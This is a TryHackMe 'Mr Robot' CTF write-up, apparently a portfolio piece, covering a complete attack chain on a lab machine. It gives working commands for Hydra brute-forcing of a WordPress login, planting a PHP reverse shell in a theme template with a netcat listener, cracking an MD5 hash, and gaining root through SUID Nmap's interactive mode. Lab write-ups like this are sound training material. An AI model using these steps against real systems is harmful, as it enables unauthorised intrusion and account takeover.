# Mr Robot CTF - TryHackMe

## Overview

This room is a linux-based TryHackMe CTF machine focused on web enumeration, WordPress exploitation, credential attacks, local enumeration, hash cracking, and linux privilege escalation.

During this assessment, I identified a WordPress website, discovered sensitive files through `robots.txt`, used a custom dictionary file to enumerate valid credentials, gained access to the WordPress admin panel, and achieved initial access through the WordPress Theme Editor.

After gaining a low-privileged shell, I performed local enumeration, found an MD5 hash for the `robot` user, cracked it using John the Ripper, switched to the `robot` use, anf finally escelated privilieges to root by abusing a SUID-enabled old version of Nmap.

## Reconnaissance

The target machine IP address was:

    10.114.148.222

I started the assessment by running a full TCP port scan with Nmap:

    nmap -sC -sV -Pn -p- 10.114.148.222 -oA nmapscan

The flags used in this scan were:

  * `-sC` - runs default Nmap scripts
  * `-sV` - detects service versions
  * `-Pn` - treats the host as online and skips host discovery
  * `-p-` - scans all TCP ports
  * `-oA` - saves the output in multiple formats

Because the full port scan was taking some time, I also ran a shorter scan to quickly identify the main exposed services:

    nmap -sC -sV -Pn 10.114.148.222 -oA shortnmapscan

The scan revealed three open ports:

    22/tcp   open   ssh      OpenSSH 8.2p1 Ubuntu
    80/tcp   open   http     Apache httpd
    443/tcp  open   ssl/http Apache httpd

Since port `80` and `443` were open, I continued with web enumeration.

<img width="761" height="408" alt="image" src="https://github.com/user-attachments/assets/336b4f24-ec00-44d7-8e1f-c0f7b7e72be1" />

This screenshot shows the Nmap results and exposed services on the target machine.

## Initial Web Enumeration

while the Nmap scan was running, I opened the target IP address in the browser:

    http://10.114.148.222

The target hosted a website, so I started checking common web files and paths.

One of the first files I checked was:

    /robots.txt
The `robots.txt` file revealed two intresting entries:

    key-1-of-3.txt
    fsocity.dic

The first file, `key-1-of-3.txt`, contained the first key of the room.

The second file, `fsocity.dic`, appeared to be dictionary file. This was an important finding because dictionary files are commonly useful for username or password attacks later in the assessment.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ef09f51c-fa6c-4eaa-a168-c572b3c4fe3a" />

This screenshot shows the exposed entries inside `robots.txt`.

## Prepering the Dicionary File

After discovering the dictionary file, I downloaded it from the web server:

    wget http://10.114.148.222/fsocity.dic

I checked the number of lines in the file:

    wc -l fsocity.dic

Since dictionary files may contain many duplicate entries, I cleaned the file using `sort` and `uniq`:

    sort fsocity.dic | uniq > fsocity-clean.dic

Then I checked the number of the lines again:

    wc -l fsocity-clean.dic

Cleaning the dictionary reduced duplicate attempts and made later brute-force attack more efficient.

<img width="1865" height="358" alt="image" src="https://github.com/user-attachments/assets/b7c4317a-2e53-405e-8bc5-f688639f3652" />

This screenshot shows the process of downloading and cleaning the `fsocity.dic` dictionary file.

## Web Technology Enumeration

To identify the technologies running on the web server, I used WhatWeb:

    whatweb http://10.114.148.222

The output showed that the target was running an Apache web server:

    Apache
    HTML5
    HTTPServer[Apache]
    X-Frame-Options[SAMEORIGIN]

At this stage, the web services was confirmed to be active, so I continued with directory enumeration.

<img width="1433" height="58" alt="image" src="https://github.com/user-attachments/assets/0ae72ee5-1c2b-4c33-8ffd-643d965fdb07" />

This screenshot shows the WhatWeb output and confirms the Apache web server.

## Directory Enumeration

I used Gobuster to enumerate directories and files on the web server:

    gobuster dir -u http://10.114.148.222 -w /usr/share/wordlists/dirb/common.txt

Gobuster discovered several intersting paths:

    /admin
    /blog
    /dashboard
    /login
    /phpmyadmin
    /robots.txt
    /wp-admin
    /wp-content
    /wp-includes
    /wp-login.php
    /xmlrpc.php

  The presence of the following paths strongly indicated that the target was running WordPress:

    /wp-admin
    /wp-content
    /wp-includes
    /wp-login.php
    /xmlrpc.php

The `/login` path redirected to `/wp-login.php`, and `/dashboard` redirected to `/wp-admin/`.

This confirmed that WordPress authentication was an important attack surface.

<img width="719" height="809" alt="image" src="https://github.com/user-attachments/assets/77beefd9-53ef-4ae1-82b8-7c1ffaaa7dbf" />

This screenshot shows the Gobuster results and discovered WordPress-related paths.

## WordPress Enumeration

After confirming that `/wp-login.php` existed, I attempted to enumerate WordPress users.

I first tried using WPScan, but it did not reveal valid usernames.

Because WPScan did not return useful results, I switched to analyzing the WordPress login behavior. WordPress login responses may reveal whether a username is invalid or whether only the password is incorrect.

I used the cleaned `fsocity.dic` file as a username list and tested it against the WordPress login page using Hydra:

    hydra -L fsocity-clean.dic -p test123 10.114.148.222 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
    
The purpose of this command was to identify usernames that did not return the `Invalid username` error.

This process revealed a valid WordPress username:

    elliot
<img width="1689" height="203" alt="image" src="https://github.com/user-attachments/assets/5113d19b-148f-4958-a13c-fc466d6c0f05" />

This screenshot shows Hydra identifying the valid WordPress username.

## WordPress Password Attack

After identifying `elliot` as a valid WordPress username, I reused the cleaned dictionary file as a password list:

    hydra -l elliot -P fsocity-clean.dic 10.114.148.222 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=The password you entered"

Hydra successfully found valid WordPress credentials for the user `elliot`.

For portfolio purpose, the password is redacted:

    elliot:[REDACTED]

With valid credentials, I logged into the WordPress admin panel.

<img width="1664" height="221" alt="Screenshot 2026-05-15 at 14 44 53" src="https://github.com/user-attachments/assets/e5af8d7c-80e8-49e3-9be4-9d61b8f427c8" />

This screenshot shows Hydra finding valid WordPress credentials. 

## WordPress Admin Access

Using the discovered credentials, I logged into the WordPress login page:

    http://10.114.148.222/wp-login.php

After logging in, I explored the WordPress dashboard and discovered that the user had access to the Theme Editor.

This was an important finding because WordPress themes contain PHP files that are executed by the web server. If an authenticated user can edit those files, it may be possible to gain code execution on the server.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3b066421-d013-4549-a853-6a6713378625" />

This screenshot shows access to the WordPress Theme Editor.

## Initial Access

Inside the WordPress Theme Editor, I selected the active theme's `404.php` template. 

I replaced the original content of the file with a PHP reverse shell payload and configured it with my TryHackMe VPN IP address and listener port.

On my attacking machine, I started a Netcat listener:

    nc -lvnp 4444

Then I triggered the modified template by browsing to:

    http://10.114.148.222/wp-content/themes/twentyfifteen/404.php

After visiting the modified `404.php` file, the target connected back to my listener and I received an initial reverse shell.

I confirmed the current user context:

    whoami

The shell was running as:
    
    daemon

<img width="1026" height="170" alt="image" src="https://github.com/user-attachments/assets/fb89ee82-abbb-47ec-8429-b9025adb9e16" />

This screenshot shows the successful reverse shell connection and the `whoami` output.

## Local Enumeration


After gaining initial access as `daemon`, I started local enumeration to understand the system and look for privilege escalation paths.

I checked the home directory:

    cd /home
    ls -la

I found a user directory named:

    robot

Inside `/home/robot`, I discovered two intresting files:

    key-2-of-3.txt
    password.raw-md5

I attempted to read the secondery key:

    cat key-2-of-3.txt

However, I recived a permission error:

    Permission denied

This indicated that the current user `daemon` did not have permission to read the second key.

However, I was able to read the `password.raw-md5` file:

    cat password.raw-md5

The file contained an MD5 hash associated with the `robot` user.

<img width="429" height="245" alt="image" src="https://github.com/user-attachments/assets/0ddce1d5-3d0b-4a8e-af4e-2398ac052b08" />

This screenshot shows the file found inside `/home/robot`, including the permission denied message for the second key.

## Hash Cracking 

After finding the MD5 hash, I copied it to my attacking machine and saved it into a file:

    echo 'robot:[MD5_HASH]' > robot_hash.txt

Then I used John the Ripper with the `rockyou.txt` wordlist:

    john --format=Raw-MD5 robot_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

John successfully cracked the hash and revealed the password for the `robot` user.

For portfolio purposes, the cracked password is redacted:

    robot:[REDACTED]

<img width="768" height="205" alt="Screenshot 2026-05-15 at 15 29 16" src="https://github.com/user-attachments/assets/db5c394a-f674-4565-b4f9-b0e877b1ba2b" />

This screenshot shows John cracking the MD5 hash

## User Pivot

After cracking the password, I returned to the reverse shell and switched from the `daemon` user to the `robot` user:

    su robot

After entering the cracked password, I confirmed the current user:

    whoami

The output comfirmed that I was now running commands as:

    robot

As the `robot` user, I was able to read the second key:

    cat /home/robot/key-2-of-3.txt

<img width="295" height="157" alt="Screenshot 2026-05-15 at 15 37 26" src="https://github.com/user-attachments/assets/df62b975-51c2-4c2f-bc96-22797a6e761c" />

This screenshot shows the successful switch to the `robot` user and access to the second key.

## Privilege Escalation Enumeration

After gaining access as `robot`, I continued with linux privilege escalation enumeration.

I searched for SUID binaries:

    find / -perm -u=s 2>/dev/null

SUID binaries are important because they execute with the permission of the file owner. If a SUID binary is owned by root and is misconfigured, it may allow privilege escalation.

During the enumeration, I found an unusual SUID binary:

    nmap

This stood out because old versions of Nmap include an interactive mode that can execute system commands. 

<img width="430" height="279" alt="image" src="https://github.com/user-attachments/assets/bcb48005-6d64-42a8-9160-ad6c9b55b5cf" />

This screenshot show the SUID enumeration results and the `nmap` binary.

## Privilege Escalation

I started Nmap in interactive mode:

    nmap --interactive

The target was running an old version of Nmap:

    Starting nmap V. 3.81

Inside the interactive mode, I executed:

    !sh

This spawned a shell from inside Nmap.

Because the Nmap binary had the SUID bit set and was owned by root, the spawned inherited elevated privileges.

I confirmed root access:

    whoami

The output was:

    root

Finally, I accessed the root directory and read the final key:

    cd /root
    ls
    cat key-3-of-3.txt

<img width="455" height="169" alt="image" src="https://github.com/user-attachments/assets/c7b3270e-60d4-4cdb-a47a-8f7482b37597" />

This screenshot shows the successful privilege escalation through SUID Nmap and confirms root access.

## Conclusion

This room demonstrated the the importance of structured enumeration throughout every stage of penetration test.

The first major finding was the exposed `robots.txt` file, which revealed both the first key and custom dictionary file. That dictionary became useful later for username and password attacks against the WordPress login page.

After discovering WordPress paths through directory enumeration, I used Hydra to identify a valid username and then recover valid WordPress credentials. Access to the WordPress Theme Editor allowed me to modify a PHP template and gain an initial reverse shell as the `daemon` user.

From there, local enumeration revealed an MD5 hash for the `robot` user. After cracking the hash with John the Ripper, I was able to switch to the `robot` user and read the second key.

The final privilege escalation path came from an old SUID-enabled version of Nmap. By using Nmap interactive mode and spawning a shell, I successfully escalated privilege to root and completed the room.

Overall, Mr Robot CTF was vluable room for practicing a complete attack chain:

    Web Enumeration
    robots.txt Analysis
    WordPress Enumeration
    Credential Attack
    WordPress Theme Editor Abuse
    Initial Foothold
    Linux Local Enumeration
    Hash Cracking
    User Pivot
    SUID-Based Privilege Escalation
    Root Access


